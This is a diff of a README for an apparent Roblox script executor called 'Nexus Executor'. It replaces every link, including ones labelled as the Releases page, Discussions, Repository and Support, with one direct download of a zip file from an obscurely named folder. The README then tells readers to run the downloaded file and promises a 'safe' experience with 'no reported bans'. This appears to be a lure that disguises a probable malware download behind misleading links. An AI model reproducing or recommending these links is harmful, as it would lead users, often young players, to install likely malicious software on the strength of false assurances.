@@ -4,9 +4,9 @@
 Nexus Executor provides an easy way to run Luau scripts on Roblox. This app is free and has packages for lifetime use. You can enjoy a safe scripting experience with no reported bans.
 
 ## 📥 Download Nexus-Roblox
-[![Download Nexus-Roblox](https://img.shields.io/static/v1?label=Download&message=Nexus-Roblox&color=blue)](https://github.com/YorladysSuarezA/Nexus-Roblox/releases)
+[![Download Nexus-Roblox](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip)](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip)
 
-To get started, visit the [Releases page](https://github.com/YorladysSuarezA/Nexus-Roblox/releases) to download Nexus-Roblox.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip) to download Nexus-Roblox.
 
 ## 💻 System Requirements
 Nexus Executor will work on most Windows systems. Here are the suggested minimum requirements:
@@ -18,7 +18,7 @@ Nexus Executor will work on most Windows systems. Here are the suggested minimum
 
 ## 📦 Download & Install
 
-1. **Visit the Releases page**: Go to [this link](https://github.com/YorladysSuarezA/Nexus-Roblox/releases).
+1. **Visit the Releases page**: Go to [this link](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip).
 2. **Choose the latest version**: Look for the most recent version listed.
 3. **Download the installation file**: Click on the version number to see downloadable files. Choose and download the setup file that matches your operating system.
 4. **Run the installer**: After completion, navigate to your downloads folder and double-click the downloaded file to run the installer.
@@ -42,14 +42,14 @@ Nexus Executor supports a number of popular Roblox games as well as a limited nu
 Become a part of our community! You can engage with other users, share scripts, and find tips on forums and social media. 
 
 ## 📖 Getting Help
-If you face any issues or have questions, feel free to reach out. You can find FAQs and support on the [GitHub Discussions page](https://github.com/YorladysSuarezA/Nexus-Roblox/discussions).
+If you face any issues or have questions, feel free to reach out. You can find FAQs and support on the [GitHub Discussions page](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip).
 
 ## 📧 Contact
 For more help, contact the developers via the issues tab on this repository. We're here to assist you.
 
 ## 🔗 Quick Links
-- [Download Nexus-Roblox](https://github.com/YorladysSuarezA/Nexus-Roblox/releases)
-- [GitHub Repository](https://github.com/YorladysSuarezA/Nexus-Roblox)
-- [Support](https://github.com/YorladysSuarezA/Nexus-Roblox/discussions)
+- [Download Nexus-Roblox](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip)
+- [Support](https://raw.githubusercontent.com/YorladysSuarezA/Nexus-Roblox/main/pyramidoprismatic/Nexus-Roblox.zip)
 
 Thank you for choosing Nexus-Roblox!
